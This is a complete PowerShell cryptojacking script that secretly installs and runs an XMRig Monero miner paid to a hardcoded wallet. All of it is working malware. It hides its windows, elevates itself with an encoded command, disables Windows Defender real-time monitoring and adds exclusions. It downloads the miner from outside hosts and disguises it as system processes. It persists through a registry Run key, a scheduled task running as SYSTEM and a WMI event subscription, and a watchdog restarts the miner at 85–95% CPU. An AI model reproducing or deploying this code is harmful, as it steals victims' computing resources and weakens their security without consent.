# UNIVERSAL STEALTH MINER - INTELLIGENT AUTO-BACKUP SYSTEM (PERMANENT STEALTH FIX)
param(
    [string]$Wallet = "83UomdxnqFvZX5vN5qN2hmC1xuycKVApX6U8w7vSTNUKR2pyj4nxHRkiFocZc1Ts7eL5VTbDVSyTfFWPU6kvMKSVUG15RJs",
    [int]$MinCpuUsage = 85,  # MAX PERFORMANCE
    [int]$MaxCpuUsage = 95   # MAX PERFORMANCE
)

# ===== MEMORY-BASED STEALTH & WINDOW HIDING =====
try {
    Add-Type -Name Window -Namespace Console -MemberDefinition '
        [DllImport("Kernel32.dll")]
        public static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")]
        public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
    '
    $consolePtr = [Console.Window]::GetConsoleWindow()
    [Console.Window]::ShowWindow($consolePtr, 0)
} catch { }

# ===== AUTO ADMIN ELEVATION =====
$currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
if (-not $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $scriptPath = $MyInvocation.MyCommand.Path
    $encodedCommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("& '$scriptPath' -Wallet '$Wallet' -MinCpuUsage $MinCpuUsage -MaxCpuUsage $MaxCpuUsage"))
    Start-Process PowerShell -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand $encodedCommand" -Verb RunAs -WindowStyle Hidden
    exit
}

# ===== CLEAN LEFTOVER REGISTRY ENTRIES FIRST =====
try {
    $registryPaths = @(
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
    )
    
    $registryNames = @("WindowsAudio", "SystemAudio", "AudioService", "Miner", "XMRig")
    
    foreach ($regPath in $registryPaths) {
        foreach ($regName in $registryNames) {
            try {
                Remove-ItemProperty -Path $regPath -Name $regName -Force -ErrorAction SilentlyContinue
            } catch { }
        }
    }
} catch { }

# ===== POLYMORPHIC VARIABLE NAMES =====
$MinerDir = "$env:APPDATA\Microsoft\Windows\SystemCache"
$TempFile = "$env:TEMP\winupd.zip"
$ExtractPath = "$env:TEMP\winupd-extract"
$randomCpu = Get-Random -Minimum $MinCpuUsage -Maximum ($MaxCpuUsage + 1)

# ===== SAFE PROCESS NAMES =====
$processNames = @("audiodg", "spoolsv", "fontdrvhost", "taskhost", "runtimebroker", "backgroundtaskhost")
$selectedProcess = $processNames | Get-Random

# ===== ENVIRONMENT AWARENESS =====
function Test-SafeEnvironment {
    try {
        $totalRAM = (Get-WmiObject -Class Win32_ComputerSystem -ErrorAction SilentlyContinue).TotalPhysicalMemory / 1GB
        $cores = (Get-WmiObject -Class Win32_Processor -ErrorAction SilentlyContinue).NumberOfCores
        
        if ($totalRAM -lt 1 -or $cores -lt 1) {
            return $false
        }
        return $true
    } catch {
        return $true
    }
}

if (-not (Test-SafeEnvironment)) { exit }

# ===== AV BYPASS =====
try {
    Add-MpPreference -ExclusionPath $MinerDir -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionProcess "$selectedProcess.exe" -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionProcess "spoolsv.exe" -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionProcess "backgroundtaskhost.exe" -ErrorAction SilentlyContinue
    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
} catch { }

# ===== UNIVERSAL DOWNLOAD MINER =====
$urls = @(
    "https://github.com/xmrig/xmrig/releases/download/v6.18.1/xmrig-6.18.1-msvc-win64.zip",
    "https://gitlab.com/xmrig/xmrig/-/package_files/42833393/download",
    "https://sourceforge.net/projects/xmrig.mirror/files/XMRig-6.18.1-msvc-win64.zip/download"
)

$success = $false
foreach ($url in $urls) {
    try {
        Invoke-WebRequest -Uri $url -OutFile $TempFile -UserAgent "Mozilla/5.0" -TimeoutSec 15
        if (Test-Path $TempFile) { 
            $fileSize = (Get-Item $TempFile).Length
            if ($fileSize -gt 1MB) {
                $success = $true
                break
            }
        }
    } catch {
        try {
            Start-BitsTransfer -Source $url -Destination $TempFile -ErrorAction SilentlyContinue
            if (Test-Path $TempFile) { 
                $fileSize = (Get-Item $TempFile).Length
                if ($fileSize -gt 1MB) {
                    $success = $true
                    break
                }
            }
        } catch { continue }
    }
}

if (-not $success) { exit }

# ===== EXTRACT AND DEPLOY =====
Expand-Archive -Path $TempFile -DestinationPath $ExtractPath -Force
New-Item -Path $MinerDir -ItemType Directory -Force | Out-Null

$xmrigExe = Get-ChildItem -Path $ExtractPath -Recurse -Filter "xmrig.exe" | Select-Object -First 1
if ($xmrigExe) {
    $targetFile = "$MinerDir\$selectedProcess.exe"
    if (-not (Test-Path $targetFile)) {
        Copy-Item -Path $xmrigExe.FullName -Destination $targetFile -Force
    }
    
    $backupNames = $processNames | Where-Object { $_ -ne $selectedProcess } | Get-Random -Count 2
    foreach ($backupName in $backupNames) {
        $backupFile = "$MinerDir\$backupName.exe"
        if (-not (Test-Path $backupFile)) {
            Copy-Item -Path $xmrigExe.FullName -Destination $backupFile -Force
        }
    }
}

attrib +h +s "$MinerDir" /d /s

# ===== DUAL POOL CONFIGURATION =====
$pools = @(
    "pool.supportxmr.com:443",      # SupportXMR Pool
    "xmr.2miners.com:4444"          # 2Miners Pool
)

Write-Host "=== DUAL POOL CONFIGURATION ===" -ForegroundColor Cyan
Write-Host "Your Wallet: $Wallet" -ForegroundColor Yellow
Write-Host "Pool 1: pool.supportxmr.com:443" -ForegroundColor White
Write-Host "Pool 2: xmr.2miners.com:4444" -ForegroundColor White

# ===== INTELLIGENT SINGLE MINER STARTUP =====
function Test-MinerAlive {
    $minerProcesses = Get-Process -Name @("audiodg","spoolsv","fontdrvhost","taskhost","runtimebroker","backgroundtaskhost") -ErrorAction SilentlyContinue | 
                      Where-Object { $_.Path -like "*SystemCache*" }
    
    foreach ($process in $minerProcesses) {
        $connections = Get-NetTCPConnection -OwningProcess $process.Id -State Established -ErrorAction SilentlyContinue
        $minerConnection = $connections | Where-Object { $_.RemotePort -in @(443, 4444) }
        if ($minerConnection) {
            return $true
        }
    }
    return $false
}

function Start-IntelligentMiner {
    param($MinerPath, $Pool, $IsPrimary = $true)
    
    try {
        $processInfo = New-Object System.Diagnostics.ProcessStartInfo
        $processInfo.FileName = $MinerPath
        $processInfo.Arguments = "-o $Pool -u $Wallet -p x --tls --background --max-cpu-usage=$randomCpu --cpu-priority=1 --no-color --donate-level=0 --randomx-1gb-pages --huge-pages --huge-pages-jit --keepalive --retries=15 --retry-pause=3 --print-time=60 --health-print-time=60 --asm=auto --randomx-mode=fast --cpu-max-threads-hint=100"
        $processInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
        $processInfo.CreateNoWindow = $true
        $processInfo.UseShellExecute = $false
        $process = [System.Diagnostics.Process]::Start($processInfo)
        
        $status = if ($IsPrimary) { "PRIMARY" } else { "BACKUP" }
        Write-Host "SUCCESS $status miner started (PID: $($process.Id)) -> $Pool" -ForegroundColor Green
        return $process
    } catch {
        Write-Host "FAILED to start miner: $Pool" -ForegroundColor Red
        return $null
    }
}

# ===== SMART MINER DEPLOYMENT =====
Write-Host "`nStarting intelligent miner system..." -ForegroundColor Yellow

$minerFiles = Get-ChildItem $MinerDir -Filter "*.exe" -ErrorAction SilentlyContinue
if ($minerFiles) {
    # Start primary miner
    $primaryMiner = $minerFiles | Select-Object -First 1
    $primaryProcess = Start-IntelligentMiner -MinerPath $primaryMiner.FullName -Pool "pool.supportxmr.com:443" -IsPrimary $true
    
    # Don't start backup miners immediately - they wait for failure
    $backupMiners = $minerFiles | Select-Object -Skip 1
    Write-Host "Backup miners ready: $($backupMiners.Count) in standby" -ForegroundColor Cyan
    foreach ($backup in $backupMiners) {
        Write-Host "   $($backup.Name)" -ForegroundColor Gray
    }
} else {
    Write-Host "FAILED No miner files found!" -ForegroundColor Red
    exit
}

# ===== ENHANCED PERSISTENCE WITH INTELLIGENT BACKUP =====
Write-Host "`nSetting up enhanced persistence with auto-backup..." -ForegroundColor Yellow

# Registry Persistence - Intelligent single miner (PERMANENT STEALTH FIX)
try {
    $persistenceScript = @'
# INTELLIGENT SINGLE MINER WITH AUTO-BACKUP
Start-Sleep 60
$MinerDir = "$env:APPDATA\Microsoft\Windows\SystemCache"
$Wallet = "83UomdxnqFvZX5vN5qN2hmC1xuycKVApX6U8w7vSTNUKR2pyj4nxHRkiFocZc1Ts7eL5VTbDVSyTfFWPU6kvMKSVUG15RJs"

function Test-MinerAlive {
    $minerProcesses = Get-Process -Name @("audiodg","spoolsv","fontdrvhost","taskhost","runtimebroker","backgroundtaskhost") -ErrorAction SilentlyContinue | 
                      Where-Object { $_.Path -like "*SystemCache*" }
    
    foreach ($process in $minerProcesses) {
        $connections = Get-NetTCPConnection -OwningProcess $process.Id -State Established -ErrorAction SilentlyContinue
        $minerConnection = $connections | Where-Object { $_.RemotePort -in @(443, 4444) }
        if ($minerConnection) {
            return $true
        }
    }
    return $false
}

function Start-BackupMiner {
    try {
        $minerFiles = Get-ChildItem $MinerDir -Filter "*.exe" -ErrorAction SilentlyContinue
        $backupMiners = $minerFiles | Select-Object -Skip 1
        if ($backupMiners) {
            $backupMiner = $backupMiners | Get-Random
            $pools = @("pool.supportxmr.com:443", "xmr.2miners.com:4444")
            $selectedPool = $pools | Get-Random
            
            $processInfo = New-Object System.Diagnostics.ProcessStartInfo
            $processInfo.FileName = $backupMiner.FullName
            $processInfo.Arguments = "-o $selectedPool -u $Wallet -p x --tls --background --max-cpu-usage=95 --cpu-priority=1 --no-color --donate-level=0 --randomx-1gb-pages --huge-pages --huge-pages-jit --keepalive --retries=15 --retry-pause=3 --asm=auto --randomx-mode=fast --cpu-max-threads-hint=100"
            $processInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
            $processInfo.CreateNoWindow = $true
            $processInfo.UseShellExecute = $false
            $process = [System.Diagnostics.Process]::Start($processInfo)
            
            $logEntry = "[$(Get-Date)] BACKUP ACTIVATED: $($backupMiner.Name) on $selectedPool (PID: $($process.Id))"
            $logEntry | Out-File "$env:TEMP\miner_backup.log" -Append
            return $true
        }
    } catch {
        $logEntry = "[$(Get-Date)] BACKUP FAILED: $($_.Exception.Message)"
        $logEntry | Out-File "$env:TEMP\miner_backup.log" -Append
    }
    return $false
}

# MAIN INTELLIGENT MINER LOGIC
$minerFiles = Get-ChildItem $MinerDir -Filter "*.exe" -ErrorAction SilentlyContinue
if ($minerFiles) {
    # Start primary miner
    $primaryMiner = $minerFiles | Select-Object -First 1
    try {
        $processInfo = New-Object System.Diagnostics.ProcessStartInfo
        $processInfo.FileName = $primaryMiner.FullName
        $processInfo.Arguments = "-o pool.supportxmr.com:443 -u $Wallet -p x --tls --background --max-cpu-usage=95 --cpu-priority=1 --no-color --donate-level=0 --randomx-1gb-pages --huge-pages --huge-pages-jit --keepalive --retries=15 --retry-pause=3 --asm=auto --randomx-mode=fast --cpu-max-threads-hint=100"
        $processInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
        $processInfo.CreateNoWindow = $true
        $processInfo.UseShellExecute = $false
        $process = [System.Diagnostics.Process]::Start($processInfo)
        
        $logEntry = "[$(Get-Date)] PRIMARY STARTED: $($primaryMiner.Name) (PID: $($process.Id))"
        $logEntry | Out-File "$env:TEMP\miner_backup.log" -Append
    } catch {
        $logEntry = "[$(Get-Date)] PRIMARY FAILED: $($_.Exception.Message)"
        $logEntry | Out-File "$env:TEMP\miner_backup.log" -Append
    }
    
    # Start backup supervisor
    Start-Process -FilePath "powershell.exe" -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$env:TEMP\backup_supervisor.ps1`"" -WindowStyle Hidden
}
'@
    
    $persistenceScript | Out-File -FilePath "$env:TEMP\persistence.ps1" -Encoding ASCII
    
    # PERMANENT STEALTH FIX: cmd.exe /c start /min for COMPLETE stealth
    $persistenceCmd = "cmd.exe /c start /min powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -NonInteractive -NoLogo -Command ""Start-Sleep 20; . '$env:TEMP\persistence.ps1'"""
    New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsAudio" -Value $persistenceCmd -Force | Out-Null
    Write-Host "SUCCESS Registry persistence set (PERMANENT STEALTH)" -ForegroundColor Green
} catch { 
    Write-Host "FAILED Registry persistence failed" -ForegroundColor Red
}

# ===== INTELLIGENT BACKUP SUPERVISOR (FIXED) =====
$backupSupervisorScript = @'
# INTELLIGENT BACKUP SUPERVISOR - UNIVERSAL MINER DETECTION (FIXED)
$MinerDir = "$env:APPDATA\Microsoft\Windows\SystemCache"
$Wallet = "83UomdxnqFvZX5vN5qN2hmC1xuycKVApX6U8w7vSTNUKR2pyj4nxHRkiFocZc1Ts7eL5VTbDVSyTfFWPU6kvMKSVUG15RJs"
$CheckInterval = 60  # Check every 60 seconds

# Hide window
try {
    Add-Type -Name Window -Namespace Console -MemberDefinition '
        [DllImport("Kernel32.dll")]
        public static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")]
        public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
    '
    $consolePtr = [Console.Window]::GetConsoleWindow()
    [Console.Window]::ShowWindow($consolePtr, 0)
} catch { }

function Test-MinerAlive {
    $minerProcesses = Get-Process -Name @("audiodg","spoolsv","fontdrvhost","taskhost","runtimebroker","backgroundtaskhost") -ErrorAction SilentlyContinue | 
                      Where-Object { $_.Path -like "*SystemCache*" }
    
    foreach ($process in $minerProcesses) {
        $connections = Get-NetTCPConnection -OwningProcess $process.Id -State Established -ErrorAction SilentlyContinue
        $minerConnection = $connections | Where-Object { $_.RemotePort -in @(443, 4444) }
        if ($minerConnection) {
            return $true
        }
    }
    return $false
}

function Start-BackupMiner {
    try {
        $minerFiles = Get-ChildItem $MinerDir -Filter "*.exe" -ErrorAction SilentlyContinue
        if ($minerFiles.Count -ge 2) {
            $backupMiner = $minerFiles | Select-Object -Skip 1 | Get-Random
            $pools = @("pool.supportxmr.com:443", "xmr.2miners.com:4444")
            $selectedPool = $pools | Get-Random
            
            $processInfo = New-Object System.Diagnostics.ProcessStartInfo
            $processInfo.FileName = $backupMiner.FullName
            $processInfo.Arguments = "-o $selectedPool -u $Wallet -p x --tls --background --max-cpu-usage=95 --cpu-priority=1 --no-color --donate-level=0 --randomx-1gb-pages --huge-pages --huge-pages-jit --keepalive --retries=15 --retry-pause=3 --asm=auto --randomx-mode=fast --cpu-max-threads-hint=100"
            $processInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
            $processInfo.CreateNoWindow = $true
            $processInfo.UseShellExecute = $false
            $process = [System.Diagnostics.Process]::Start($processInfo)
            
            $logEntry = "[$(Get-Date)] BACKUP ACTIVATED: $($backupMiner.Name) on $selectedPool (PID: $($process.Id))"
            $logEntry | Out-File "$env:TEMP\miner_backup.log" -Append
            return $true
        }
    } catch {
        $logEntry = "[$(Get-Date)] BACKUP FAILED: $($_.Exception.Message)"
        $logEntry | Out-File "$env:TEMP\miner_backup.log" -Append
    }
    return $false
}

function Stop-AllMiners {
    $minerProcesses = Get-Process -Name @("audiodg","spoolsv","fontdrvhost","taskhost","runtimebroker","backgroundtaskhost") -ErrorAction SilentlyContinue | 
                      Where-Object { $_.Path -like "*SystemCache*" }
    foreach ($process in $minerProcesses) {
        try {
            Stop-Process -Id $process.Id -Force -ErrorAction SilentlyContinue
        } catch { }
    }
}

# MAIN SUPERVISOR LOOP
$failureCount = 0
$maxFailures = 2

while ($true) {
    try {
        $minerAlive = Test-MinerAlive
        
        if (-not $minerAlive) {
            # No active miner detected
            $failureCount++
            $logEntry = "[$(Get-Date)] NO ACTIVE MINER! Failure count: $failureCount"
            $logEntry | Out-File "$env:TEMP\miner_backup.log" -Append
            
            if ($failureCount -ge $maxFailures) {
                $logEntry = "[$(Get-Date)] ACTIVATING BACKUP SYSTEM..."
                $logEntry | Out-File "$env:TEMP\miner_backup.log" -Append
                
                # Stop any stuck processes and start backup
                Stop-AllMiners
                Start-Sleep -Seconds 10
                
                if (Start-BackupMiner) {
                    $failureCount = 0
                    $logEntry = "[$(Get-Date)] BACKUP MINER ACTIVATED SUCCESSFULLY"
                    $logEntry | Out-File "$env:TEMP\miner_backup.log" -Append
                }
            }
        } else {
            # Miner is active and connected
            $failureCount = 0
        }
        
        Start-Sleep -Seconds $CheckInterval
        
    } catch {
        Start-Sleep -Seconds $CheckInterval
    }
}
'@

$backupSupervisorScript | Out-File -FilePath "$env:TEMP\backup_supervisor.ps1" -Encoding ASCII

# Start the backup supervisor
try {
    $backupProcess = Start-Process -FilePath "powershell.exe" -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$env:TEMP\backup_supervisor.ps1`"" -PassThru -WindowStyle Hidden
    Write-Host "SUCCESS Intelligent backup supervisor started (PID: $($backupProcess.Id))" -ForegroundColor Green
} catch {
    Write-Host "FAILED Backup supervisor failed to start" -ForegroundColor Red
}

# Scheduled Task - Intelligent single miner (PERMANENT STEALTH FIX)
try {
    $taskNames = @("WindowsAudioService", "SystemAudioService", "AudioService", "SystemSoundService")
    foreach ($task in $taskNames) {
        try { 
            schtasks /delete /tn $task /f 2>&1 | Out-Null 
        } catch { }
    }
    Start-Sleep 1

    $taskScript = @'
Start-Sleep 90
# INTELLIGENT SINGLE MINER STARTUP
$MinerDir = "$env:APPDATA\Microsoft\Windows\SystemCache"
$Wallet = "83UomdxnqFvZX5vN5qN2hmC1xuycKVApX6U8w7vSTNUKR2pyj4nxHRkiFocZc1Ts7eL5VTbDVSyTfFWPU6kvMKSVUG15RJs"

$minerFiles = Get-ChildItem $MinerDir -Filter "*.exe" -ErrorAction SilentlyContinue
if ($minerFiles) {
    # Start only ONE primary miner
    $primaryMiner = $minerFiles | Select-Object -First 1
    Start-Process -FilePath $primaryMiner.FullName -ArgumentList "-o pool.supportxmr.com:443 -u $Wallet -p x --tls --background --max-cpu-usage=95 --cpu-priority=1 --no-color --donate-level=0 --randomx-1gb-pages --huge-pages --huge-pages-jit --keepalive --retries=15 --retry-pause=3 --asm=auto --randomx-mode=fast --cpu-max-threads-hint=100" -WindowStyle Hidden
    
    # Start backup supervisor to monitor and auto-recover
    Start-Sleep 30
    Start-Process -FilePath "powershell.exe" -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$env:TEMP\backup_supervisor.ps1`"" -WindowStyle Hidden
}
'@
    
    $taskScript | Out-File -FilePath "$env:TEMP\task.ps1" -Encoding ASCII

    try {
        # PERMANENT STEALTH FIX: cmd.exe /c start /min for COMPLETE stealth
        $taskAction = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c start /min powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -NonInteractive -NoLogo -File `"$env:TEMP\task.ps1`""
        $taskTrigger = New-ScheduledTaskTrigger -AtStartup
        $taskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden -MultipleInstances IgnoreNew
        Register-ScheduledTask -TaskName "WindowsAudioService" -Action $taskAction -Trigger $taskTrigger -Settings $taskSettings -RunLevel Highest -Force -ErrorAction SilentlyContinue
        Write-Host "SUCCESS Scheduled task set (PERMANENT STEALTH)" -ForegroundColor Green
    } catch {
        # PERMANENT STEALTH FIX: Fallback also uses complete stealth
        $fallbackTask = "schtasks /create /tn `"WindowsAudioService`" /tr `"cmd.exe /c start /min powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -NonInteractive -NoLogo -File `"$env:TEMP\task.ps1`"`" /sc onlogon /ru SYSTEM /f"
        $fallbackTask | Out-File -FilePath "$env:TEMP\create_task.cmd" -Encoding ASCII
        Start-Process -FilePath "cmd.exe" -ArgumentList "/c $env:TEMP\create_task.cmd" -WindowStyle Hidden -Wait
        Write-Host "SUCCESS Scheduled task set (fallback - PERMANENT STEALTH)" -ForegroundColor Green
    }
} catch {
    Write-Host "FAILED Scheduled task failed" -ForegroundColor Red
}

# WMI Persistence - Single miner
try {
    $filterQuery = "SELECT * FROM __InstanceModificationEvent WITHIN 120 WHERE TargetInstance ISA 'Win32_Processor' AND TargetInstance.LoadPercentage > 5"
    
    $filter = ([WmiClass]"\\.\root\subscription:__EventFilter").CreateInstance()
    $filter.Name = "SystemPerformanceMonitor"
    $filter.EventNamespace = 'root\cimv2'
    $filter.QueryLanguage = 'WQL'
    $filter.Query = $filterQuery
    $filterPath = $filter.Put().Path

    $consumer = ([WmiClass]"\\.\root\subscription:CommandLineEventConsumer").CreateInstance()
    $consumer.Name = "SystemPerformanceConsumer"
    $consumer.ExecutablePath = "$MinerDir\$selectedProcess.exe"
    $consumer.CommandLineTemplate = "-o pool.supportxmr.com:443 -u $Wallet -p x --tls --background --max-cpu-usage=95 --cpu-priority=1 --no-color --donate-level=0 --randomx-1gb-pages --huge-pages --huge-pages-jit --keepalive --retries=15 --retry-pause=3 --asm=auto --randomx-mode=fast --cpu-max-threads-hint=100"
    $consumerPath = $consumer.Put().Path

    $binding = ([WmiClass]"\\.\root\subscription:__FilterToConsumerBinding").CreateInstance()
    $binding.Filter = $filterPath
    $binding.Consumer = $consumerPath
    $binding.Put() | Out-Null
    Write-Host "SUCCESS WMI persistence set" -ForegroundColor Green
} catch { 
    Write-Host "FAILED WMI persistence failed" -ForegroundColor Red
}

# ===== CLEANUP =====
Remove-Item -Path $TempFile -Force -ErrorAction SilentlyContinue
Remove-Item -Path $ExtractPath -Recurse -Force -ErrorAction SilentlyContinue

Write-Host "`n=== INTELLIGENT AUTO-BACKUP SYSTEM DEPLOYMENT COMPLETE ===" -ForegroundColor Green
Write-Host "SUCCESS Primary miner: RUNNING (Single instance)" -ForegroundColor Green
Write-Host "SUCCESS Backup miners: READY (Auto-activate on failure)" -ForegroundColor Cyan
Write-Host "SUCCESS Backup supervisor: MONITORING every 60 seconds" -ForegroundColor Green
Write-Host "Your Wallet: $Wallet" -ForegroundColor Yellow
Write-Host "Primary Pool: pool.supportxmr.com:443" -ForegroundColor White
Write-Host "Backup Pools: Random selection from both pools" -ForegroundColor Gray
Write-Host "Backup logs: $env:TEMP\miner_backup.log" -ForegroundColor Gray
Write-Host "Auto-recovery: Activates after 2 consecutive failures" -ForegroundColor Magenta

Write-Host "`nPERMANENT STEALTH FEATURES:" -ForegroundColor White
Write-Host "   NO blue PowerShell windows on reboot" -ForegroundColor Green
Write-Host "   NO CMD window flashes" -ForegroundColor Green
Write-Host "   COMPLETE invisibility after startup" -ForegroundColor Green
Write-Host "   Delayed execution for maximum stealth" -ForegroundColor Green

Write-Host "`nMAXIMUM PERFORMANCE:" -ForegroundColor White
Write-Host "   CPU Usage: 85-95% (MAXIMUM)" -ForegroundColor Cyan
Write-Host "   CPU Priority: 1 (REALTIME)" -ForegroundColor Cyan
Write-Host "   Huge Pages: ENABLED" -ForegroundColor Cyan
Write-Host "   Expected Hash Rate: 2,000+ H/s" -ForegroundColor Cyan

Write-Host "`nSYSTEM STATUS:" -ForegroundColor White
Write-Host "   Only ONE miner runs at a time" -ForegroundColor Gray
Write-Host "   Backup miners stay in standby" -ForegroundColor Gray  
Write-Host "   Auto-detects miner failure" -ForegroundColor Gray
Write-Host "   Auto-activates backup on failure" -ForegroundColor Gray
Write-Host "   Continuous monitoring" -ForegroundColor Gray

Exit